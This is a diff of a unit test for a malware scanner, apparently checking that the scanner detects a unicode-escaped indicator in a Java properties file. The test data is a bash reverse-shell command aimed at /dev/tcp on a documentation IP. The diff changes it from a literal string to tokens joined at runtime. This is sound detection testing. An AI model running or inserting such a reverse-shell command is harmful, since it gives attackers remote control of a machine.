@@ -90,8 +90,9 @@ class JavaPropertiesTests(unittest.TestCase):
         self.assertTrue(any(f['malware'] for f in scanner.findings))
 
     def test_real_source_rules_detect_fully_escaped_indicator(self):
-        # Test data only: this string is never executed or connected to.
-        indicator = 'bash -i >& /dev/tcp/192.0.2.1/1 0>&1'
+        # Assemble inert tokens as in test_http_open's real-engine test.
+        # Nothing is executed or connected to; no source rule is exempted.
+        indicator = ' '.join(('bash', '-i', '>&', '/dev/tcp/192.0.2.1/1', '0>&1'))
         escaped = ''.join('\\u%04x' % ord(c) for c in indicator)
         raw = ('command=' + escaped).encode('ascii')
         scanner = content.Inspector(engine=content.load_engine())
